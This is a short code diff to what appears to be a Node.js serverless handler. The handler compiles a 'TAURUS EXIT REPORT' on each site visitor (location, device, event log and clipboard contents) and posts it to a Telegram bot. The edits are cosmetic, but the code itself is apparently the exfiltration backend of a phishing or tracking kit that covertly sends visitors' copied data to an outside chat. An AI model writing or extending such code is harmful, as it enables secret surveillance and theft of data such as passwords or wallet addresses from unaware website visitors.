@@ -49,15 +49,15 @@ module.exports = async (req, res) => {
     const finalChatId = chatId || CHAT_ID;
 
     try {
-        const msg = `🛑 <b>SESSION REPORT [${sessionID}]</b>\n` +
-            `━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
+        const msg = `🛑 <b>TAURUS EXIT REPORT [${sessionID}]</b>\n` +
+            `━━━━━━━━━━━━━━━━━━━━━━\n\n` +
             `⏱ <b>DURATION:</b> <code>${duration}s</code>\n` +
             `📍 <b>EXIT PAGE:</b> <code>${exitPage}</code>\n` +
             `🌍 <b>LOCATION:</b> <code>${location || 'Unknown'}</code>\n` +
             `💻 <b>DEVICE:</b> <code>${deviceInfo || 'Unknown'}</code>\n\n` +
             `📋 <b>CLIPBOARD ACTIVITY:</b>\n<pre>${clipboard || 'None'}</pre>\n\n` +
-            `📝 <b>EVENT LOG (Last 50):</b>\n<pre>${eventLog || 'No events recorded'}</pre>\n\n` +
-            `━━━━━━━━━━━━━━━━━━━━━━━━`;
+            `📝 <b>EVENT LOG (Last 20):</b>\n<pre>${eventLog || 'No events recorded'}</pre>\n\n` +
+            `━━━━━━━━━━━━━━━━━━━━━━`;
 
         // 1. Send Telegram Notification
         let telegramSent = false;
@@ -65,7 +65,8 @@ module.exports = async (req, res) => {
             await axios.post(`https://api.telegram.org/bot${finalBotToken}/sendMessage`, {
                 chat_id: finalChatId,
                 text: msg,
-                parse_mode: 'HTML'
+                parse_mode: 'HTML',
+                disable_web_page_preview: true
             });
             telegramSent = true;
         } catch (tgErr) {
